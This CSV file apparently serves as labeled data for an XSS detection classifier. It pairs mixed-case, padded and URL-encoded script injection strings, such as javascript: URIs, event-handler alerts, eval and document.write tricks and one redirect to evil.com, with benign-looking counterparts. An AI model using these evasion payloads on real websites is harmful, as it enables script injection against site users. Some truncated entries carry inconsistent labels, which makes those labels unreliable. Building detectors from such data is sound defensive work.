payload,label
4515Ks<img onload=showMenu()>58fhD,0
<SvG OnMOusEoVEr=aleRT(1)>,1
<sPan oNfOCus=nOop()>,0
<svG onMouseovEr=INiT()>,0
<iMg Onclick=ShoWMENu()>,0
<ScrIpT>DOCuMENt.WriTe('<imG SRC=x oNERroR=ALert(1)>')</scrIpt>,1
<a OncLIck=ValiDaTe()>,0
"<ScRIpt>sEttiMeOuT('Alert(1)',1000)</scrIPt>",1
njgtAjavascript:prompt(1)MGA3,1
<A OnMoUsEoVer=ShowmENU()>,0
uKM<span onload=alert(1)>zb8fn,1
jAvaSCrIPT:VOid(0),0
9G7u<div onfocus=alert(1)>jHjmR,1
<SvG onmOuSEovER=PRompt(1)>,1
ExeA<div onload=prompt(1)>eAMk,1
k58Qi<span onfocus=highlight()>FB,0
6j4tw<div onclick=prompt(1)>x9C4,1
JavaSCriPT:voID(0),0
<scRiPT>WInDoW</scRIpt>,1
<a onfocus,0
l7i<img onclick=highlight()>de,0
JAvAscRiPT:PrOMpt(1),1
<sPAn oNmoUseOVEr=PromPt(1)>,1
hPa<span onmouseover=alert(1)>eBo,1
<SVG oNFoCuS=ALert(1)>,1
<IMG onLoad=alErT(1)>,1
<IMG OnloAD=coNFirM(1)>,1
<div ONLoad=COnFIrm(1)>,1
Tdh<img onfocus=confirm(1)>pOcZPU,1
<Svg oNFocUs=prOMPT(1)>,1
MxnW8K<a onclick=confirm(1)>Taa,1
jAvAsCRIPT:ConFiRM(1),1
<SVg ONCliCK=ProMpT(1)>,1
<a OnMOUSEOVer=ConFiRM(1)>,1
<svg onclick=confirm,1
HP2p<a onmouseover=init()>yX,0
jaVAsCRipT:vOID(0),0
JAVaSCRipt:VoId(0),0
J9t25J<div onfocus=alert(1)>gFD,1
jAVAScRiPt:VoId(0),0
Yyd<span onmouseover=prompt(1)>begm,1
Se6fuv<div onmouseover=showMenu()>OST,0
jAvAscRIpT:ProMpt(1),1
JavAsCRiPt:PROMpt(1),1
<Img OnmoUSeoVer=aLert(1)>,1
tb<script>eval('alert(1)')</script>jGuq,1
BNaS<span onload=showMenu()>nyT,0
T6<a onmouseover=validate()>wB9,0
u1CSUl<span onfocus=highlight()>DGoe,0
<IMG onlOAD=CoNFIrm(1)>,1
<a onmOUseOver=AlErt(1)>,1
jaVAsCRIPt:alERT(1),1
JavascrIpt:ProMpt(1),1
<SVG OnMoUsEOver=ALerT(1)>,1
4M<script>window</script>LW3ie6,1
<svg onmouseover=pro,1
WY0uEqjavascript:void(0)ydpjZE,0
<DIV OnLOaD=CoNFiRM(1)>,1
"""'><script>alert(1)</script>",1
<A OncliCk=cONFirm(1)>,1
javASCRIpT:cONFirM(1),1
<span onload=highli,0
iLjavascript:void(0)clIt,0
<spAn ONloaD=ShoWMenU()>,0
<Svg ONmOUsEovEr=ALeRt(1)>,1
<div onfocus=high,0
<script>doCUmenT.Write('<IMg Src=X OnERRoR=aLERT(1)>')</SCRIPT>,1
l5yojavascript:prompt(1)Krx6,1
<SVg onclicK=higHlIGHt()>,0
15javascript:void(0)OpW,0
<Svg ONLoAD=init()>,0
<a OnfoCUS=vALiDATE()>,0
<A ONmouSEoVER=hIGhLigHT()>,0
JAVAScrIpt:AlerT(1),1
<a ONLoad=ALert(1)>,1
<svG oNMouseOVer=PRompT(1)>,1
<a onMouseOvEr=AleRt(1)>,1
jAVascriPt:PRomPT(1),1
HT<script>window</script>sVYt,1
Zf5<a onmouseover=showMenu()>pqSU,0
"<sCRipT>SEtTiMeouT('ALert(1)',1000)</ScriPT>",1
<A ONCLICk=sHowmENU()>,0
xfjavascript:void(0)oof4cE,0
pO<script>eval('alert(1)')</script>c0Q,1
<sCRipt>DOCumEnt.wRiTe('<ImG src=x oNerrOR=alErT(1)>')</ScRipt>,1
<sPan oNfocus=CoNfiRM(1)>,1
<SpAN onfoCuS=showMeNu()>,0
<SCrIpt>docuMent.wRiTe('<iMG sRc=x OnErRor=AleRT(1)>')</SCrIpT>,1
<img onmouSeovEr=PRoMpT(1)>,1
<span oNCLicK=ShoWmenu()>,0
JAVAScRiPT:VOid(0),0
JAvascRipt:voId(0),0
<a onlOad=aLErt(1)>,1
JaVasCript:ALErt(1),1
jAVAscRIPT:CoNFiRm(1),1
c5<div onfocus=noop()>UJbZBH,0
2WJ<a onclick=validate()>XhSnc,0
<SCriPT>DOcUment.WRIte('<IMG sRC=x oNERROR=alErt(1)>')</scRIpt>,1
IKp<a onfocus=prompt(1)>fpvbw,1
<diV OnFOCus=pROMpt(1)>,1
<scrIPT>EvAL('ALErT(1)')</SCRIpt>,1
<SvG OnfOCus=SHowmeNU()>,0
jAVASCrIPT:prOmPt(1),1
<scrIPT>Eval('AlerT(1)')</SCRIpt>,1
<sPaN onmoUSEOver=higHliGHT()>,0
jAVascriPT:pRomPT(1),1
<a onclick=validate()>,0
jAvAscrIPt:aLErt(1),1
mDr<script>document.write('<img src=x onerror=alert(1)>')</script>ux,1
RTEzq<div onclick=alert(1)>tJK,1
IhC<div onmouseover=highlight()>trPY,0
3Nkaf<script>window</script>kJo0iU,1
<SCriPT>eVal('aLErT(1)')</sCrIpt>,1
<scRiPT>EVal('ALeRT(1)')</sCripT>,1
o6iguWjavascript:void(0)cLIIW,0
<ScRIpt>EVAl('AlERT(1)')</SCRipt>,1
<span oncLIcK=HiGHLiGHt()>,0
jAvASCrIPt:conFIrM(1),1
<sVg onMoUsEoVeR=aLerT(1)>,1
<DiV OnLoad=iNit()>,0
SnRjavascript:prompt(1)X8e6,1
<sVG onMoUsEOveR=confIrm(1)>,1
<A oNMOuSEovER=ConfIrM(1)>,1
"Qd<script>setTimeout('alert(1)',1000)</script>qugXWL",1
jAvasCRipT:prOMpT(1),1
t5Ik<div onmouseover=prompt(1)>1OJErY,1
CL<script>window</script>MIi8Y,1
CWbiujavascript:prompt(1)Y8,1
<sVG oNloAd=prOMpt(1)>,1
<sPan onFocuS=AlERT(1)>,1
<a ONMoUSEOver=noop()>,0
WqBu<script>document.write('<img src=x onerror=alert(1)>')</script>rzjpJb,1
<dIv onloAD=valIdaTE()>,0
<DiV OnmousEOVeR=vAlIdATe()>,0
<IMG onloaD=ALErT(1)>,1
<DIv OnMoUSeoveR=hIGhLIgHT()>,0
%3Cimg%20onmouseover%3DshowMenu%28%29%3E,0
<SpAN oNlOAD=NooP()>,0
NDkGOjavascript:alert(1)KY,1
<iMG OnloAD=ConFiRm(1)>,1
<svg onfoCuS=hiGHLiGHt()>,0
"<SCrIPt>sEtTImEoUt('ALERt(1)',1000)</sCripT>",1
E1tsd5<img onmouseover=validate()>SbE,0
5kj<script>window</script>3YQO1,1
XtnrZ<svg onfocus=prompt(1)>Eo,1
JavAsCripT:ALeRT(1),1
jAvaSCRIpt:PrOMpt(1),1
N8FJ<img onmouseover=highlight()>fcf,0
<sVG oncLiCK=Init()>,0
gp<script>document.write('<img src=x onerror=alert(1)>')</script>7U48NH,1
<img onfocus=confirm(1)>,1
JAvasCrIpt:ALErt(1),1
bAK<script>document.write('<img src=x onerror=alert(1)>')</script>eu,1
<Svg onFoCUS=ShoWmENu()>,0
FW1IP<span onclick=init()>K2pp4,0
<div onload=init(,0
<div onclick=validate(,0
JAvASCRiPt:proMpt(1),1
<IMG onLOaD=PrOMpt(1)>,1
JavaScript:Void(0),0
Pq<svg onmouseover=validate()>I29zr,0
<Div ONFoCUS=init()>,0
OTWQv<script>document.write('<img src=x onerror=alert(1)>')</script>sSZy,1
<svg onLOad=VaLiDATe()>,0
JAVAsCrIpT:void(0),0
<a Onclick=VALidATe()>,0
jI<img onclick=init()>9VD7,0
<SvG ONfOcuS=prompT(1)>,1
<SCRIPt>DocumENT.wrItE('<imG SRc=X ONerror=AleRt(1)>')</ScripT>,1
<Div onlOAD=ALERt(1)>,1
btd<script>eval('alert(1)')</script>3iuN,1
jaVAsCrIPT:ALert(1),1
<sCripT>eVaL('AlerT(1)')</ScRIPT>,1
<dIV ONFocUS=ALERt(1)>,1
<svg onclick=prompt(1,1
<img onclick=noo,0
<div oNMOuSeOveR=aleRT(1)>,1
<svG oNLOaD=hIGHlight()>,0
<DIv onMOuseOver=aLeRT(1)>,1
javAScRiPT:aLeRt(1),1
<div onload=hig,0
N4kgT8<svg onload=alert(1)>lrCAFh,1
"<Script>SetTIMEOUT('AlERt(1)',1000)</ScripT>",1
"<SCRIpT>SettimEOUt('alerT(1)',1000)</sCrIpt>",1
<Img oNclick=cONFIRM(1)>,1
KHAP<div onfocus=alert(1)>kzcrx,1
j30o3<span onmouseover=validate()>8lWnSC,0
jml8fH<script>document.write('<img src=x onerror=alert(1)>')</script>thO,1
<A ONclicK=INIt()>,0
document.location%3D%27http%3A//evil.com%27,1
<imG onlOAd=NooP()>,0
Pe<script>document.write('<img src=x onerror=alert(1)>')</script>oxD,1
<SpAn oncliCk=alERT(1)>,1
<A onLOAD=aLeRT(1)>,1
eI5qLTjavascript:confirm(1)rq34x,1
%3Cdiv%20onclick%3Dprompt%281%29%3E,1
9S3nDjavascript:void(0)kGSeSQ,0
<DiV OnloaD=sHoWmenu()>,0
<sCRIpT>DOcumENt.wRiTE('<iMg sRC=x oNERROR=ALeRT(1)>')</SCRIpt>,1
<sCRipT>dOCumENt.wRiTe('<iMG Src=x oNERROr=aLert(1)>')</SCrIpT>,1
<img onload=alert,1
mban<span onmouseover=highlight()>0Mm,0
<DIV oNlOaD=HighlIGht()>,0
YEjavascript:void(0)GbT,0
<DiV oNMOUSeoveR=Noop()>,0
<ImG onLOAD=ALERT(1)>,1
sTgiO6javascript:confirm(1)7JY4,1
lOb1javascript:void(0)9X5oQ,0
6Bsy<span onfocus=alert(1)>2A,1
<sPAN onMoUSEoVer=pRoMPt(1)>,1
<img onload=al,1
<a oNcLIck=Noop()>,0
<sPAn onmOuseoVer=HIGhlIGht()>,0
<IMG oNmOuseoveR=INIt()>,0
<div ONfOCus=pRoMpT(1)>,1
<SCript>dOcuMeNT.WrItE('<Img SrC=X oNeRrOR=aleRt(1)>')</sCrIPT>,1
<A onfOCUS=ShowmeNU()>,0
<div oncLICK=vaLIdate()>,0
<ScRipt>EvAl('aLERt(1)')</scrIPt>,1
<ScRipt>Window</scRiPT>,1
Ae9<div onload=prompt(1)>E4qRfU,1
<spAn ONlOAD=ConFirM(1)>,1
<spAN ONlOAD=CONFIrm(1)>,1
mgX<script>eval('alert(1)')</script>tbRaT1,1
jAVascRIpT:VOiD(0),0
jAvAscrIPt:void(0),0
JAvAsCRIpt:alERT(1),1
CaSn<script>window</script>6FIY17,1
b7gywL<script>document.write('<img src=x onerror=alert(1)>')</script>ewa2UQ,1
<svg onclick=promp,1
vD6D6sjavascript:void(0)T9,0
JAvaScrIPT:pROMPt(1),1
<Span oNFOCuS=vaLiDaTe()>,0
r5K<svg onclick=noop()>xphhm,0
bJy<img onclick=alert(1)>4a,1
JaVASCrIpT:vOiD(0),0
aHSHRjavascript:void(0)ZdJLk,0
<IMg oNfoCUs=HiGHlIgHT()>,0
<A ONLoAd=ValidaTE()>,0
<svG ONfocUS=NOoP()>,0
<SPAn ONloAd=hIGHligHt()>,0
<img ONclIcK=PRompt(1)>,1
<a oNClICk=shoWMenu()>,0
<sVg ONLoad=pROmPT(1)>,1
og6<svg onmouseover=showMenu()>wqoSr,0
d6eIjavascript:confirm(1)eYB3P,1
<A ONcliCK=COnFirm(1)>,1
<dIV ONclick=pRomPt(1)>,1
<sPaN onLOaD=COnfiRM(1)>,1
"B4dDV<script>setTimeout('alert(1)',1000)</script>yB8",1
T1j<a onfocus=alert(1)>Vb9,1
<SVG ONmoUseOVEr=CONfIRm(1)>,1
<SVg onfocuS=vaLIdATE()>,0
<A ONlOad=aLeRt(1)>,1
<sPAn oNlOad=VaLIDAtE()>,0
s4Yj1Xjavascript:void(0)vu6rk,0
JAvascRiPt:VoiD(0),0
<iMg OnlOAd=InIt()>,0
<sVG onMOuseOvER=iNIt()>,0
FMjFc<svg onclick=validate()>A1A,0
<SPan ONLOaD=vAlIDate()>,0
19<img onload=highlight()>v7iPsV,0
AU<img onfocus=alert(1)>x9zO,1
<svG oNfOCus=sHowMeNU()>,0
mBGII<svg onclick=confirm(1)>25s,1
LlDXH<a onclick=alert(1)>B3,1
<SPaN oNMoUseOver=ProMPT(1)>,1
SE<svg onload=noop()>9nttF,0
ormAU<div onload=validate()>4Y6nIF,0
<sCRIPT>doCUmeNT.wrItE('<ImG Src=x ONerRor=alErt(1)>')</scRIpT>,1
1I<div onclick=noop()>5a,0
<Div onClIck=HIGhLIgHT()>,0
<ScRipt>WINdOw</scRiPt>,1
jAvasCRipt:PROmpt(1),1
<A oNcLIcK=prOmPT(1)>,1
<svg onload=valid,0
<sVG OnLoAD=inIT()>,0
javAsCRIpT:VoID(0),0
<SpAN oNMOUSeoVER=aleRt(1)>,1
"<sCript>SetTiMEout('aLeRt(1)',1000)</scrIpt>",1
<sCRIPt>wINDow</scrIpT>,1
JavaScRiPT:PrOmPt(1),1
<dIv oNFocUS=init()>,0
<SVG ONmousEovEr=nOOp()>,0
SFvgjavascript:alert(1)cb,1
<SCrIPT>dOcuMeNT.WrItE('<iMg SRC=x ONerror=AleRt(1)>')</SCRIpT>,1
<iMG OnmOUseovER=VaLIDAte()>,0
<DIv ONFoCuS=cOnfIRm(1)>,1
<DiV ONMOUSEoVeR=hiGHLIGHt()>,0
EdRjavascript:confirm(1)WHY,1
<img oNcLICK=iniT()>,0
<SCRIpT>dOcUMeNT.wrITE('<img Src=X oNerroR=AlERT(1)>')</SCriPT>,1
%3Cspan%20onload%3Dhighlight%28%29%3E,0
tJdR<img onload=alert(1)>WRR,1
<SpAn OnCliCk=conFIRM(1)>,1
<sPaN oNClICk=NoOP()>,0
<DIv OnFocus=vALiDatE()>,0
<sPaN oNcLick=VALIdaTE()>,0
6Ihjavascript:void(0)2JnNTU,0
jaVASCRipt:promPt(1),1
zfjavascript:confirm(1)WK,1
<iMg onMOUSEOveR=iniT()>,0
"<scrIPT>SEtTiMEOuT('AleRT(1)',1000)</ScRipT>",1
"<scRipt>setTIMEOUT('AleRT(1)',1000)</script>",1
<scriPT>DocUmeNT.WRiTe('<Img SRc=x ONERror=AlErT(1)>')</sCriPT>,1
<iMG ONcLICk=NOOP()>,0
%253Ca%2520onfocus%253DshowMenu%2528%2529%253E,0
<DIv oNLoaD=inIT()>,0
<sPAn onmoUSeOVeR=vALIdAtE()>,0
<IMG oNfOCUs=aLert(1)>,1
<SVg ONmOUSEoVEr=NOOP()>,0
<a oncliCk=SHOWmENu()>,0
<a oNmoUSEOVER=HIGHLIgHt()>,0
<imG onCLiCk=VAlIdaTe()>,0
RqZqY0<img onfocus=confirm(1)>yfM,1
wDzjavascript:alert(1)37V,1
ZCll4j<div onfocus=prompt(1)>xn,1
<SvG onMOUSEover=PROmPT(1)>,1
<diV ONfocUs=prOmPT(1)>,1
<DIv OnMouSEoVeR=prOmPt(1)>,1
tI4kaF<span onfocus=showMenu()>8XH,0
hnZOd<svg onfocus=noop()>eAvqFh,0
<SCRipt>wINdow</ScRIPt>,1
<imG oNMOuSEoVER=HighlIGhT()>,0
vw<script>eval('alert(1)')</script>IBr1ro,1
<DIv OnFoCus=PROmpT(1)>,1
Hx0javascript:void(0)luhWg,0
<DIV oncLIcK=cONfiRM(1)>,1
RNjavascript:confirm(1)u7,1
<imG onfocUs=aLERt(1)>,1
<sPAN OnfocUs=hIghlIGHT()>,0
<sPAn onfocUs=AlerT(1)>,1
jaVAsCRIpt:aLerT(1),1
<svG onMOuseOVer=aLErt(1)>,1
<imG onClicK=hiGhLIGHt()>,0
<scrIPt>eVAl('ALErt(1)')</ScrIPt>,1
KBZTjavascript:prompt(1)C1zrbs,1
JAvasCriPt:voId(0),0
jAVAScRIpt:alert(1),1
aUjavascript:confirm(1)NqcO,1
FPO<span onload=prompt(1)>nn,1
h7HGM<img onfocus=validate()>2N4KX,0
TqQku<div onclick=confirm(1)>lt5LN,1
JavAScriPT:aleRT(1),1
<DiV oNMoUSEOVeR=pROmPt(1)>,1
<DIv ONCliCk=ShOwmENu()>,0
<sPan OnLoAD=AlErt(1)>,1
<A ONCliCk=NOoP()>,0
<sPAn onfoCUs=nOoP()>,0
WkR0Yu<svg onclick=prompt(1)>1mA,1
<a oNLOad=cONfIrM(1)>,1
<a oNmousEOVER=VAlIDAte()>,0
EB<script>document.write('<img src=x onerror=alert(1)>')</script>B8TkkQ,1
hJ8qIR<a onmouseover=highlight()>VKl,0
<ScRIpT>dOCUMEnt.Write('<iMg SRC=X oneRRor=aLERT(1)>')</SCRiPt>,1
JAVAscrIPT:PromPT(1),1
H6ifcq<img onfocus=showMenu()>X3oF,0
jaVaSCRIpT:alErt(1),1
JavAsCript:confIrM(1),1
Hk8Dt<a onload=prompt(1)>rE,1
<spaN onmousEOvER=cOnfiRm(1)>,1
<img onloa,1
<a onclick=confirm(,1
8KhuS<img onfocus=alert(1)>liM,1
<sVg ONLOAD=CoNFiRm(1)>,1
QPEp<a onclick=alert(1)>xKsDZ,1
JaVascRiPT:PrOMpt(1),1
Y4F<a onload=confirm(1)>Pe,1
YxWon<script>window</script>HVXB,1
<IMG OnMousEoVER=INIt()>,0
yRXY<script>document.write('<img src=x onerror=alert(1)>')</script>Fi,1
YBgX2q<div onload=prompt(1)>ux3A,1
<DIV oNClIck=coNFiRM(1)>,1
P293N<img onmouseover=init()>dU,0
<A onLOaD=alert(1)>,1
<imG oNfOcuS=vaLIDATE()>,0
<script>setTimeout('alert(1,1
JavASCripT:proMPt(1),1
<sVg ONfoCus=prOmPT(1)>,1
7PcaJx<div onmouseover=prompt(1)>2Y,1
<dIV oNclIck=HigHlIGHT()>,0
ePjavascript:alert(1)HN,1
<SCrIpt>doCuMENT.wrItE('<Img src=x OnerROR=alerT(1)>')</scRipt>,1
<SVg onmouSeovER=InIT()>,0
<IMG OnFocUs=aleRt(1)>,1
v2raP<div onmouseover=prompt(1)>rJ4wt1,1
hMOpTn<div onload=init()>NeEe,0
A2Uv<a onclick=alert(1)>EYKo,1
JavasCrIPT:VOId(0),0
9g<script>document.write('<img src=x onerror=alert(1)>')</script>vxdIqK,1
<DIv OnLOad=prOmPT(1)>,1
Nn<a onmouseover=init()>Un,0
<a oNMOuseoVER=hIgHLigHt()>,0
grjzOi<div onclick=noop()>9z,0
<SPan OnmouSeOVeR=PROMPT(1)>,1
<SCRiPT>EvAL('ALeRt(1)')</ScriPT>,1
<dIv onCLiCk=CONfIRM(1)>,1
<span onload=conf,1
vLl<script>document.write('<img src=x onerror=alert(1)>')</script>UNhq,1
psjavascript:void(0)1P,0
<DIV ONfoCus=NoOP()>,0
<img OnCLICk=INIT()>,0
9kCyjavascript:confirm(1)AZz0q,1
Ub<img onclick=confirm(1)>XMu9,1
aOs<img onfocus=validate()>g0bJz,0
pTraQ2javascript:alert(1)Eok,1
jAVAsCRIpT:COnfirm(1),1
<dIv oNFOcUS=conFirm(1)>,1
<iMG onmOUSEovEr=INIT()>,0
<Div ONFOCUS=higHliGhT()>,0
<imG ONMOUSEoveR=iNIt()>,0
<svg onfocus=co,1
"0TPQ11<script>setTimeout('alert(1)',1000)</script>P4UAcW",1
wGmz<div onfocus=validate()>WMb,0
<svg ONloAD=PrOMPT(1)>,1
<sCriPT>eVaL('alErt(1)')</SCRiPt>,1
<DiV ONlOAD=INiT()>,0
<svg onload=,0
LN<a onload=prompt(1)>bS,1
Jw3N95<img onclick=noop()>2wNm,0
"Ns<script>setTimeout('alert(1)',1000)</script>zKss",1
<dIv onfOcus=Alert(1)>,1
<spAN onfocuS=nOop()>,0
<imG oNClICK=aLERT(1)>,1
"<sCrIPt>sETtIMEouT('ALeRT(1)',1000)</scripT>",1
<img ONlOAd=iNIT()>,0
<svG oNlOAd=alERt(1)>,1
1xjavascript:confirm(1)sgE,1
<div ONFocus=alErt(1)>,1
jaVaSCriPT:CONFIrM(1),1
<Img oNClIck=nooP()>,0
<DIv ONFocus=COnfIrm(1)>,1
<imG OnFOCuS=NOoP()>,0
jAvAsCript:ConFIrM(1),1
<ImG OnlOAd=alErt(1)>,1
<sVG OnmOuSEover=init()>,0
<Img oNfoCUs=hiGhligHt()>,0
<sCRiPT>eVAL('Alert(1)')</sCriPt>,1
<scRiPT>EVaL('ALeRt(1)')</sCRIPt>,1
ruNHJjavascript:void(0)PjzH,0
<a oNCLicK=cOnFIrm(1)>,1
DFdjavascript:confirm(1)t5n,1
gNZLn7<div onfocus=highlight()>PKR4U,0
<Img ONFocUs=iNiT()>,0
ZIdShv<img onclick=noop()>nQ39aT,0
<sPAn OnCliCK=proMpT(1)>,1
tUFPZ9<span onmouseover=prompt(1)>Z9nF,1
<imG OnfOcUS=PROMPT(1)>,1
JAvASCrIpt:CoNfirm(1),1
NK<a onload=showMenu()>MpnMii,0
<sCRipt>evaL('AleRt(1)')</ScripT>,1
yqbADljavascript:alert(1)iW,1
p1javascript:alert(1)A3eEKc,1
shI1bL<svg onclick=noop()>chFRf,0
voC48G<span onclick=validate()>6mtRt,0
jaVAscript:pRoMpt(1),1
9p0<div onfocus=showMenu()>qg,0
"<sCriPT>sEttIMEout('AlERt(1)',1000)</sCRIpT>",1
pXjavascript:void(0)wYu,0
<sVg OnfOCUs=conFIrM(1)>,1
JaVASCrIpt:PrOmpT(1),1
JavaScRipT:coNFirm(1),1
<SvG onFoCuS=coNfIRM(1)>,1
<a onclick=noop(,0
PTl<div onfocus=confirm(1)>g5TIr,1
<spAN OnMOuSEOvEr=iNiT()>,0
<img ONclICk=vALiDaTe()>,0
JAVaScRiPT:VoID(0),0
w2PN<span onfocus=showMenu()>7oaX,0
<span onfocus=validate()>,0
<sVG oNClIcK=HIghLIGHt()>,0
jAVasCRIPT:CoNFIrm(1),1
<dIv onmoUSeover=PromPT(1)>,1
<sCRIPT>winDoW</scRIpT>,1
<iMg ONmouSeOVEr=prOMpT(1)>,1
<SpAn ONFoCus=SHOwMenu()>,0
<SpAN OnMOusEovEr=cONfIRm(1)>,1
tb<span onclick=alert(1)>cUd,1
<sCRipt>eval('ALerT(1)')</sCript>,1
Od<svg onmouseover=showMenu()>mpLJ,0
5WGojavascript:confirm(1)jje,1
jAvascRIPT:aLeRT(1),1
qaO<a onfocus=noop()>Tl0m,0
<ScRiPt>evAl('aLERt(1)')</scRIpT>,1
<svg OnMOuSeoVer=cOnFiRM(1)>,1
<sVg oNMOUSEOveR=confirM(1)>,1
0iCbkS<a onfocus=prompt(1)>6MY,1
<img onLOaD=init()>,0
<a OnmOUSEOVer=cOnfirM(1)>,1
<SCRiPt>wIndoW</sCRipt>,1
h96javascript:alert(1)zsd7d4,1
9oUrK<svg onmouseover=alert(1)>ZT4U8,1
<imG oNMoUsEOVeR=HiGhliGhT()>,0
%253Cspan%2520onload%253DshowMenu%2528%2529%253E,0
I9FXLn<a onfocus=alert(1)>KMM,1
<IMg ONLoAD=aLErT(1)>,1
<SVG oNFOCUs=cONfirm(1)>,1
<SpAn onMOUseoVEr=inIT()>,0
<SvG OnlOaD=PRoMpT(1)>,1
<ScrIPT>dOcuMEnt.WrItE('<iMg SRC=X OnErROr=aLErT(1)>')</SCriPT>,1
52Iqk<script>eval('alert(1)')</script>24C0j,1
px2LNjavascript:void(0)1o8iN,0
<SvG OnFOCus=valIDaTe()>,0
jMnjo<a onclick=prompt(1)>hhxLal,1
<SVG oncLICk=PROmPT(1)>,1
<div oNloAD=aleRt(1)>,1
jyy<img onmouseover=highlight()>Fr,0
BXLDr<svg onload=confirm(1)>lqquVf,1
JAvAScript:VOid(0),0
wUCz<img onfocus=showMenu()>tOt,0
<sPAN OnmouseovER=ConfIrm(1)>,1
1yHuQ8<a onload=prompt(1)>irZVY0,1
JavASCRipT:VOid(0),0
<SVG onFOCUS=ALERT(1)>,1
<a OnCLick=valiDaTE()>,0
JavAscRiPt:COnFIrm(1),1
<Div ONLOAD=ALErT(1)>,1
sjg<svg onfocus=prompt(1)>eULiv,1
6wPV<script>eval('alert(1)')</script>eO,1
JAvaScriPt:aLeRt(1),1
JaVaSCRiPt:PrOmpT(1),1
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529,1
3ba<div onload=validate()>Cp9,0
vN6Z<img onclick=prompt(1)>GY,1
<SVG ONmOUSEovEr=vALiDAte()>,0
<DIV onFoCUs=AleRT(1)>,1
<img ONLOAd=conFirM(1)>,1
VS<div onload=alert(1)>vQE6Bq,1
<scRIPt>wIndOW</scRIpt>,1
<spAN ONfOCUs=COnfIRM(1)>,1
<img ONlOAd=CONFiRM(1)>,1
<imG oNLOAd=HIgHliGht()>,0
<A onfoCUs=aLerT(1)>,1
<sPAN onlOaD=CONfIRM(1)>,1
xl7PwE<script>document.write('<img src=x onerror=alert(1)>')</script>Z3,1
<A ONfOcUS=proMpt(1)>,1
<DIV onclIck=CONfIrm(1)>,1
<A onmousEovEr=PRoMpT(1)>,1
<IMG ONcLiCk=HIghlIGhT()>,0
<sCrIpt>WiNDOw</ScriPT>,1
"oo<script>setTimeout('alert(1)',1000)</script>UCOms",1
nzVkQ<img onload=highlight()>Cep4,0
<ImG ONmousEOver=ProMpT(1)>,1
<sPaN ONLOad=HighlIghT()>,0
<sVG OnMOuSeOVER=coNFiRm(1)>,1
<a onClICk=NOoP()>,0
"<scrIpt>seTtIMeOUT('ALErT(1)',1000)</SCrIPt>",1
<iMG onFOcus=confIRm(1)>,1
<svG oNfocus=CoNFIrM(1)>,1
"PKi<script>setTimeout('alert(1)',1000)</script>SaF",1
<A onmoUseOVer=ConfIRM(1)>,1
jAvAscrIpT:ALERT(1),1
<A oNClICk=prompt(1)>,1
<SvG OnFOCus=nOOp()>,0
iOptTy<div onmouseover=alert(1)>Psn2,1
pZnOjavascript:confirm(1)kH20MB,1
Da2P<svg onfocus=confirm(1)>o3NIO,1
i1javascript:alert(1)5K,1
<spaN oNfocuS=aLeRT(1)>,1
<ScrIpT>wINdow</SCRIpt>,1
<a onFOcUS=hIGHLIGHT()>,0
L0XF<a onclick=prompt(1)>0rg,1
<DIv oNmouSEover=NOoP()>,0
1c4a<script>eval('alert(1)')</script>1q9vh3,1
<div onmouseover=confi,1
b4pW1Pjavascript:confirm(1)g7RIM,1
javASCRiPt:prOMPt(1),1
9vw<div onmouseover=init()>01,0
"SEwL<script>setTimeout('alert(1)',1000)</script>ZeI",1
<SPaN OnmoUseOVeR=coNfiRm(1)>,1
<svg onfocus=prompt(1,1
"<ScrIpt>seTTIMEOut('ALERT(1)',1000)</sCripT>",1
<SVg oNlOAD=alert(1)>,1
<diV OnfOCUs=noOP()>,0
JAvAscrIPt:vOId(0),0
<DiV onfoCUS=PromPt(1)>,1
JAvaSCRipt:AlErT(1),1
<sVg onmousEoVEr=SHOwmeNU()>,0
<spAn OnLOAD=shOWmEnU()>,0
jAvAscRIPt:PROMPt(1),1
<sCRIpT>dOCumEnT.WrITE('<iMg SRC=x onERROR=alERt(1)>')</ScrIpT>,1
wm<span onfocus=confirm(1)>laQI,1
sjM8U2<a onfocus=validate()>PPj1CV,0
wADjNr<div onfocus=highlight()>7Kf,0
<DIv ONmOusEoVER=INIT()>,0
<span onmouseover=validate(),0
xm<div onload=highlight()>gRJ,0
<span onload=sho,0
<DIv onCLiCk=NoOp()>,0
jAvaSCRipT:aLeRt(1),1
<SPAn OnMoUSeoVer=sHowMEnu()>,0
JaVasCRIpt:VOid(0),0
<DIv oncliCK=HIghLiGHt()>,0
<A onMoUseoVEr=CoNFiRM(1)>,1
<svg oNClICk=PROMPT(1)>,1
jr9javascript:void(0)zVJ,0
IXRwjavascript:confirm(1)Aqiml,1
bwthlG<span onmouseover=prompt(1)>2Lv,1
KC<div onclick=noop()>ek,0
<img ONlOAD=HIghliGht()>,0
jm3<svg onload=confirm(1)>KPa0,1
